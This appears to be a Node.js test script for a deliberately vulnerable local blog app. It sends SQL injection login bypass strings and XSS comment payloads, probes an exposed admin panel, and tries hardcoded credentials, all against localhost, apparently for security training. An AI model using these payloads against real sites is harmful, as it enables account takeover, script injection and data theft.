const fetch = require('node-fetch');

const BASE_URL = 'http://localhost:3000';

async function testVulnerabilities() {
    console.log('🧪 Testing Vulnerable Blog Site Vulnerabilities...\n');

    try {
        // Test 1: SQL Injection
        console.log('1. Testing SQL Injection...');
        const sqlInjectionTests = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' OR '1'='1'--"
        ];

        for (const payload of sqlInjectionTests) {
            const response = await fetch(`${BASE_URL}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: 'test', password: payload })
            });
            const result = await response.json();
            console.log(`   Payload: "${payload}" -> ${result.success ? '✅ SUCCESS' : '❌ FAILED'}`);
        }

        // Test 2: XSS in Comments
        console.log('\n2. Testing XSS in Comments...');
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<a href="javascript:alert(\'XSS\')">Click me</a>'
        ];

        for (const payload of xssPayloads) {
            const response = await fetch(`${BASE_URL}/api/comments`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    postId: 1,
                    author: 'Test User',
                    content: payload
                })
            });
            const result = await response.json();
            console.log(`   Payload: "${payload}" -> ${result.success ? '✅ ACCEPTED' : '❌ REJECTED'}`);
        }

        // Test 3: Exposed Admin Panel
        console.log('\n3. Testing Exposed Admin Panel...');
        const adminResponse = await fetch(`${BASE_URL}/admin`);
        console.log(`   Admin panel accessible: ${adminResponse.status === 200 ? '✅ YES' : '❌ NO'}`);

        const adminDataResponse = await fetch(`${BASE_URL}/api/admin/data`);
        const adminData = await adminDataResponse.json();
        console.log(`   Admin data exposed: ${adminData.users ? '✅ YES' : '❌ NO'}`);

        // Test 4: Hardcoded Credentials
        console.log('\n4. Testing Hardcoded Credentials...');
        const credentials = [
            { username: 'admin', password: 'admin123' },
            { username: 'user', password: 'password123' },
            { username: 'test', password: 'test123' }
        ];

        for (const cred of credentials) {
            const response = await fetch(`${BASE_URL}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(cred)
            });
            const result = await response.json();
            console.log(`   ${cred.username}/${cred.password}: ${result.success ? '✅ WORKS' : '❌ FAILS'}`);
        }

        console.log('\n✅ All vulnerability tests completed!');
        console.log('🌐 Visit http://localhost:3000 to explore the vulnerable site manually.');

    } catch (error) {
        console.error('❌ Error testing vulnerabilities:', error.message);
        console.log('Make sure the server is running on http://localhost:3000');
    }
}

// Run tests if this file is executed directly
if (require.main === module) {
    testVulnerabilities();
}

module.exports = { testVulnerabilities }; 